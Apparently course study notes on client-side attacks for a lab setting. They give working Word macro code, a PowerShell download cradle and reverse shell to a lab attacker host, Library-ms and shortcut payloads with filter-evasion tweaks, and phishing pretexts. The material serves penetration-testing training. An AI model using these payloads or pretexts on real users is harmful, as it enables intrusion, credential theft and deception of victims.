# Client-side Attacks Cheat Sheet (PEN-200, Ch. 12)

## Overview

Perimeter exploitation via technical vulnerabilities has become rare/difficult (per Verizon report — Phishing is the **2nd-largest** breach vector, behind credential attacks). Client-side attacks deliver malicious files/links directly to a user; once executed, we get a foothold inside the internal network.

- Client-side attacks exploit weaknesses/functions in local software: browsers, OS components, office programs.
- Requires **deceiving/persuading** the target user (social engineering) — the attack itself doesn't need an externally-exposed service, which makes it hard to mitigate and especially insidious.
- Delivery mechanisms: email attachments, links to malicious sites/files, USB dropping, watering hole attacks.
- Payload usually must be delivered to a target on a **non-routable internal network** (clients rarely exposed externally).

> Delivering payloads via email has become harder due to spam filters, firewalls, and other technologies scanning for malicious links/attachments.

Payload/vector choice depends on recon of the target's OS and installed applications:
- Windows → malicious JScript via Windows Script Host, or `.lnk` shortcut files pointing to malicious resources.
- Microsoft Office installed → documents with embedded malicious macros.

---

## 12.1 Target Reconnaissance

Goal: identify potential users and gather detailed info about their OS/installed software before attacking, to improve odds of success.

- Passive info gathering (OSINT): browsing the company website, social media, points of contact.
- Unlike a traditional attack against a server, we usually don't have a direct network connection to the target system, so we need more tailored information-gathering techniques.

### 12.1.1 Information gathering (document metadata)

Hands-off technique: inspect metadata of publicly available documents tied to the target org — no direct interaction with the target, no monitoring/forensic trace.

- Metadata tags can reveal: author, creation date, software name/version used to create the doc, client OS, and more (explicit or inferred).
- Caveats: data may be stale/outdated (older documents), different branches of an org may use different software, findings may be inaccurate — but still a viable, low-footprint approach.

**Finding documents:**
```bash
# Google dork for PDFs on the target's site (from Info Gathering module)
site:example.com filetype:pdf

# Active alternative: gobuster with -x to search for specific file extensions
# (noisy -- generates target log entries)
gobuster dir -u http://target -x pdf,doc,docx -w wordlist.txt
```
Also just browse the target website manually for downloadable documents (brochures, etc.).

**Extracting metadata with exiftool:**
```bash
cd Downloads
exiftool -a -u brochure.pdf     # -a = show duplicate tags, -u = show unknown tags
```

Key fields to check in the output: `Create Date` / `Modify Date` (document age → trust level of the intel), `Author` (internal employee name — useful for pretexting), `Producer` / `Creator Tool` (application used, e.g. "Microsoft® PowerPoint® for Microsoft 365" → confirms MS Office is used; absence of "macOS"/"for Mac" strings implies Windows was used to create it).

> The author's name can be dropped casually into a targeted email or phone call to build a trust relationship — especially effective if the author keeps a small public profile.

### 12.1.2 Client fingerprinting (Canarytokens)

Before running a Windows/IE/Edge-specific client-side attack (e.g. an HTA attack), confirm the target's OS/browser first.

**Canarytokens** — free web service generating a tracking link with an embedded token. When the target opens it, we get their browser, IP address, and OS. The victim always sees a blank page.

Workflow:
1. Load the Canarytokens token-generation page.
2. Select **Web bug / URL token**, provide a webhook/notification email, add a comment, click **Create my Canarytoken**.
3. Use a **pretext** to get the target to click the link (e.g., pose as pointing to a "screenshot of an invoice with an error highlighted" for a finance-department target).
4. Click **Manage this token** to view settings; click **History** to see visitor hits (geolocation map, per-entry detail).
5. Detailed entry info includes User-Agent (browser/OS) plus more precise/reliable **JavaScript fingerprinting** data (not from the User-Agent string) — can be exported as CSV or JSON.

> A pretext frames the situation so the target has a plausible reason to click — we generally can't just ask a stranger to click an arbitrary link.

Other Canarytoken delivery options: embed the token in a Word document or PDF (fires when opened), or in an image (fires when viewed).

Other fingerprinting options: online IP loggers (e.g. Grabify), JavaScript fingerprinting libraries (e.g. **fingerprint.js**) for a more custom/covert implementation.

---

## 12.2 Exploiting Microsoft Office

Ransomware breaches frequently start with a malicious Office macro — Office is ubiquitous and documents are routinely emailed between colleagues.

### 12.2.1 Preparing the attack

Three considerations before using malicious Office documents:

**1. Delivery method** — malicious macro attacks are well-known; spam filters/mail providers often block Office attachments outright, and anti-phishing training warns users about enabling macros. Prefer a pretext + alternate delivery (e.g., download link) over a raw email attachment.

**2. Mark of the Web (MOTW) / Protected View** — a file delivered via email or download link gets tagged with MOTW. MOTW-tagged Office docs open in **Protected View**: disables editing/modification and blocks macro/embedded-object execution. Victim sees a warning with an **Enable Editing** option.
- Even after clicking Enable Editing, macros in a MOTW-tagged file may still require the user to also click **Enable Content**, or to check **Unblock** under the file's Properties (right-click → Properties → Unblock) before the macro will run.

**3. Macros blocked by default (Microsoft's 2022 change)** — affects Access, Excel, PowerPoint, Visio, Word (rolled out from Office 2013 through Office 2021; exact rollout dates vary per update channel — check Microsoft Learn).
- Old behavior: user sees **Enable Content** button → one click runs macros.
- New behavior: user instead sees a more ominous warning message with a **Learn More** button (no simple one-click enable). Clicking Learn More opens a Microsoft page explaining macro dangers, and separately explains how to **Unblock** the file via file Properties.
- Net effect: we must now convince the user to unblock the file via the checkbox before our malicious macro will execute.

> Despite these mitigations, malicious Office macros remain one of the most common client-side attack vectors — an ongoing spiral where defenders add controls and attackers develop new bypasses.

> **Info:** Older client-side vectors like Dynamic Data Exchange (DDE) and OLE no longer work reliably without significant system modifications.

### 12.2.2 Installing Microsoft Office

Lab setup notes:
- Connect to the Windows client via RDP. Standard `rdesktop`/mstsc-style clients may not support **Network Level Authentication (NLA)**, required by default for non-domain-joined machines — use **`xfreerdp`** instead, which supports NLA.
- Mount `C:\tools\Office2019.img` via Windows Explorer (loads as virtual CD) → run `Setup.exe`.
- After install: open Word, close the trial/product-key popup (7-day trial), **Accept** the license agreement, on the privacy screen choose **No, don't send optional data** then **Accept**, click **Done** to finish.

### 12.2.3 Leveraging Microsoft Word macros

Macros = series of commands/instructions grouped to programmatically accomplish a task; orgs use them for dynamic content and linking documents to external content.

> Macros in VBA (Visual Basic for Applications) provide full access to **ActiveX objects** and the **Windows Script Host**, similar to JavaScript in HTML applications.

**Setup:**
- Create a blank Word doc and save it as `mymacro` in the legacy **`.doc`** format — required, because `.docx` cannot save embedded macros without a template. (Macros can *run* inside a `.docx` opened with a linked template, but can't be *saved inside* the `.docx` document itself.)
- View tab → **Macros** element → enter `MyMacro` as the macro name, select the `mymacro` document in the "Macros in" dropdown (must target the correct document or the macro won't save there), click **Create**. This opens the VBA editor with a macro skeleton.

**Default skeleton:**
```vb
Sub MyMacro()
'
' MyMacro Macro
'
'

End Sub
```
*(Listing 248 - Default empty macro)*

**Step 1 — trigger macro automatically + run PowerShell:**
Use `AutoOpen()` and/or `Document_Open()` (redundant pair — which one fires depends on how Word opens the doc) to call our custom `MyMacro` procedure automatically on open. Use `CreateObject("Wscript.Shell").Run` (Windows Script Host Shell object) to launch an OS command.

```vb
Sub AutoOpen()

MyMacro

End Sub

Sub Document_Open()

MyMacro

End Sub

Sub MyMacro()

CreateObject("Wscript.Shell").Run "powershell"

End Sub
```
*(Listing 250 - Macro automatically executing powershell.exe after opening the Document)*

Save → close → reopen the document → security warning appears ("macros have been disabled") → click **Enable Content** → PowerShell window pops up.

> A dialog like this is common, and users are accustomed to (and in most enterprises, allowed to) click through it — so it doesn't necessarily raise suspicion.

**Step 2 — upgrade to a reverse shell via PowerCat:**

> VBA string literals are capped at **255 characters** — can't embed a full base64-encoded PowerShell command as a single literal. This limit doesn't apply to strings stored in variables, so split the payload across multiple `Str = Str + "..."` lines and concatenate.

Declare a `Dim Str As String` and pass `Str` to `.Run`:
```vb
Sub AutoOpen()
       MyMacro

End Sub

Sub Document_Open()
       MyMacro

End Sub

Sub MyMacro()
       Dim Str As String
       CreateObject("Wscript.Shell").Run Str

End Sub
```
*(Listing 251 - Declaring a string variable and provide it as a parameter)*

> **Caution:** UTF-16LE is the default character set PowerShell expects for base64-encoded commands (`-enc`). Using any other character set breaks the payload.

Base download-cradle command (before base64 encoding), same PowerCat pattern used elsewhere in the course:
```
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2:8000/powercat.ps1');
powercat -c 192.168.119.2 -p 4444 -e powershell
```
Base64-encode it on Kali (as in the Common Web Application Attacks module), then split into ≤50-char chunks with a small Python script:
```python
str = "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwA..."

n = 50

for i in range(0, len(str), n):
       print("Str = Str + " + '"' + str[i:i+n] + '"')
```
*(Listing 253 - Python script to split a base64 encoded PowerShell command string)*

Paste the generated `Str = Str + "..."` lines into the macro:
```vb
Sub AutoOpen()
       MyMacro

End Sub

Sub Document_Open()
       MyMacro

End Sub

Sub MyMacro()
       Dim Str As String

       Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
       Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
       Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
       ...
       Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
       Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
       Str = Str + "A== "

       CreateObject("Wscript.Shell").Run Str
End Sub
```
*(Listing 254 - Macro invoking PowerShell to create a reverse shell)*

**Trigger it:**
```bash
# On Kali, before re-opening the malicious doc:
python3 -m http.server 80          # serve powercat.ps1
nc -nvlp 4444                       # catch the reverse shell
```
Re-open the document, click **Enable Content** again → reverse shell lands:
```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.119.2] from (UNKNOWN) [192.168.50.194] 49768
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements!
https://aka.ms/PSWindows

PS C:\Users\offsec\Documents>
```
*(Listing 255 - Reverse shell from Word macro)*

> Macro attacks are old and well-known, but still effective today provided the delivery/MOTW/macro-blocking considerations above are handled and the victim can be convinced to enable them.

---

## 12.3 Abusing Windows Library Files

Rationale for this vector: many security products scan for malicious macros, Microsoft provides GPO templates to block them, and awareness training targets this vector specifically — making macros harder. Windows **library files** (`.Library-ms`) are a lesser-known but equally effective alternative/delivery chain.

> **Info:** For a refresher on Group Policy Objects, see the Microsoft documentation.

### 12.3.1 Preparing the attack

Library files are virtual containers referencing remote content (e.g. WebDAV shares) but appear/behave like a normal local directory in Windows Explorer — double-clicking one browses straight into the remote location.

**Two-stage attack:**
1. **Stage 1** — victim receives a `.Library-ms` file (e.g. via email). Double-clicking it opens what looks like a regular folder — actually a WebDAV share we control.
2. **Stage 2** — inside that WebDAV directory we place a `.lnk` shortcut payload that runs a PowerShell reverse shell. Victim must be convinced to double-click the `.lnk` file.

Why not just host the `.lnk` on a plain web server and send a link? Spam filters/security tools inspect link contents for suspicious/executable file types and often filter them — but many of those same technologies pass `.Library-ms` files straight through to the user, and double-clicking one feels like opening a normal local file.

**Step 1 — stand up a WebDAV share (Kali) with WsgiDAV:**
```bash
sudo apt install python3-wsgidav

mkdir /home/kali/webdav
touch /home/kali/webdav/test.txt

wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```
*(Listing 256/257 - Installing and starting WsgiDAV on port 80)*

Verify by browsing to `http://127.0.0.1` and confirming `test.txt` is listed.

> **Warning (from WsgiDAV output):** running with `--auth=anonymous` and a writable root allows **anonymous write access** to the share — expected for this lab technique but worth remembering operationally. Enable SSL for basic auth in real use.

**Step 2 — build the `.Library-ms` file.** Connect to the Windows client via RDP (`xfreerdp`, for NLA support on non-domain machines) and use VS Code or Notepad to create a plain text file named `config.Library-ms` on the desktop.

> A `.Library-ms` file with the default/unstyled icon isn't inherently dangerous, but the icon is unusual for Windows and may raise suspicion — customize its appearance to blend in.

Library files are XML with three parts: **General library information**, **Library properties**, **Library locations**. (Reference: the Library Description Schema on Microsoft's site.)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.119.2</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
*(Listing 263 - Windows Library code for connecting to our WebDAV Share)*

Tag-by-tag reference:

| Tag | Purpose |
|---|---|
| `<name>` | Display name resource. Use `@windows.storage.dll,-34582` rather than `@shell32.dll,-34575` to dodge text filters that flag on "shell32". |
| `<version>` | Library file format version — arbitrary numeric value (e.g. `6`). |
| `<isLibraryPinned>` | `true` pins the library to the Explorer navigation pane — adds a "genuine" look. |
| `<iconReference>` | Icon shown for the library, format `dll,-index`. Use `imageres.dll`; index `-1002` = Documents folder icon, `-1003` = Pictures folder icon (used here — looks more benign). |
| `<templateInfo><folderType>` | GUID controlling which columns/details Explorer shows for this library (look up on Microsoft's docs). Example uses the **Documents** GUID `{7d49d726-3c21-4f05-99aa-fdc2c9474656}` to look convincing. |
| `<searchConnectorDescriptionList>` / `<searchConnectorDescription>` | Defines one or more remote-location "search connectors" for the library. |
| `<isDefaultSaveLocation>` | `true` = this connector is where items get saved by default when a user saves into the library. |
| `<isSupported>` | `false` here — controls a compatibility/support flag; unset for this technique. |
| `<simpleLocation><url>` | The actual remote location — our WebDAV share URL, e.g. `http://192.168.119.2`. |

Save in VS Code, then double-click `config.Library-ms` on the desktop — Explorer opens it and shows `test.txt` from the WebDAV share, confirming the connection works. The navigation-bar path shows only `config`, with no visible indication it's a remote location.

> After first opening, Windows rewrites the file: it adds a base64-encoded `serialized` tag, and changes the `<url>` content from `http://192.168.119.2` to `\\192.168.119.2\DavWWWRoot` — Windows optimizing the WebDAV connection info for its native WebDAV client.

**Step 3 — build the `.lnk` shortcut payload (stage 2).** On the desktop: right-click → **New** → **Shortcut**, enter a program path + arguments. Point it at PowerShell with a download cradle for PowerCat:
```
powershell.exe -c "IEX(New-Object
System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1');
powercat -c 192.168.119.3 -p 4444 -e powershell"
```
*(Listing 264 - PowerShell Download Cradle and PowerCat Reverse Shell Execution)*

> If a security-conscious victim checks where the shortcut points, the full malicious command is visible in the shortcut's Properties — same tradeoff as any visible-command shortcut technique used elsewhere in the course.

Serve `powercat.ps1` from a Python3 web server on port 8000, place the `.lnk` on the WebDAV share, and start a Netcat listener on port 4444.

> We could instead host `powercat.ps1` directly on the WebDAV share, but since that share is writable, AV/security solutions could quarantine or remove the payload from it. Making the share read-only would sacrifice its usefulness for exfiltrating files from target systems — so throughout the course, PowerCat is served via a separate Python3 web server instead.

Test by double-clicking the `.lnk` shortcut → confirm "run the application" prompt → reverse shell lands:
```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.119.2] from (UNKNOWN) [192.168.50.194] 49768
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements!
https://aka.ms/PSWindows

PS C:\Windows\System32\WindowsPowerShell\v1.0>
```
*(Listing 265 - Successful reverse shell connection via our Shortcut file)*

### End-to-end example: delivering to a simulated victim (HR137)

Pretext example: pose as a new IT team member rolling out a "new management platform" with a "user-friendly configuration program," instructing the target to copy the provided `config.Library-ms` file/folder contents to their desktop.

Delivery simulation via SMB share instead of email:
```bash
cd webdav
rm test.txt                              # clean up the earlier test file

smbclient //192.168.50.195/share -c 'put config.Library-ms'
```
*(Listing 267 - Uploading our Library file to the SMB share on the HR137 machine)*

Start (before delivery): Python3 web server on port 8000 (serving `powercat.ps1`), WsgiDAV serving `/home/kali/webdav`, Netcat listener on port 4444.

After the simulated victim opens the library file and double-clicks the shortcut inside it:
```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.119.2] from (UNKNOWN) [192.168.50.195] 56839
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements!
https://aka.ms/PSWindows

PS C:\Windows\System32\WindowsPowerShell\v1.0> whoami
whoami
hr137\hsmith
```
*(Listing 268 - Incoming reverse shell from HR137)*

> This library-file technique can be combined with the earlier Office macro attack, or with any other client-side attack — e.g., use the library file as the delivery/staging mechanism for a malicious macro document instead of (or alongside) a `.lnk` shortcut.

---

## 12.4 Wrapping Up

Client-side attack vectors are often effective for gaining an initial foothold in a non-routable internal network, since they exploit weaknesses/functionality of existing client software rather than requiring an externally exposed vulnerable service.

---

## Key Takeaways / Workflow Summary

1. **Recon first, always.** Determine target OS + installed software before choosing a payload — a Windows-specific `.lnk`/HTA attack needs Windows/IE/Edge; a macro attack needs Office.
   - Passive: pull public documents (Google dorks, browsing the site) and run `exiftool -a -u <file>` for Author/Producer/Create-Modify dates → infers OS + Office version + a name for pretexting.
   - Active-ish fingerprinting: send a **Canarytokens** link (with a pretext) to confirm OS/browser and get precise JS-fingerprint data.
2. **Pretext is the real payload delivery mechanism.** Every technique in this chapter assumes you can talk a human into opening a file or clicking a link — plan the pretext (job role, department, plausible business reason) before building the technical payload.
3. **Office macro path:** `.doc` (not `.docx`, can't embed macros) → View ▸ Macros → `AutoOpen`/`Document_Open` call a `MyMacro` sub → `CreateObject("Wscript.Shell").Run <cmd>` → base64-encode (UTF-16LE) a PowerShell PowerCat download-cradle command, split into ≤255-char chunks via a small Python script, concatenate into a `Dim Str As String`. Must survive MOTW/Protected View (Enable Editing → Enable Content) and, on modern Office, the "blocked by default" Learn-More flow (Unblock via file Properties).
4. **Windows Library file path:** stand up **WsgiDAV** (`--auth=anonymous`) on Kali as a WebDAV share → craft `config.Library-ms` XML pointing `<simpleLocation><url>` at the WebDAV host, with icon/GUID tags tuned to look like a normal Documents/Pictures folder → deliver stage 1 (the library file). Drop a `.lnk` shortcut (stage 2) on the WebDAV share that runs a PowerShell/PowerCat download cradle. Serve PowerCat from a separate Python3 web server (not the writable WebDAV share, to dodge AV quarantine) and catch the shell with `nc -nvlp 4444`.
5. **Both techniques converge on the same reverse-shell primitive**: PowerShell download cradle → PowerCat (`IEX(New-Object System.Net.WebClient).DownloadString('http://<kali>:8000/powercat.ps1'); powercat -c <kali> -p 4444 -e powershell`). Only the delivery/execution wrapper differs (VBA macro vs. `.lnk` shortcut).
6. These vectors can be **chained**: use a library file to deliver a malicious macro document, or any other combination — client-side attacks are modular staging problems as much as exploitation problems.
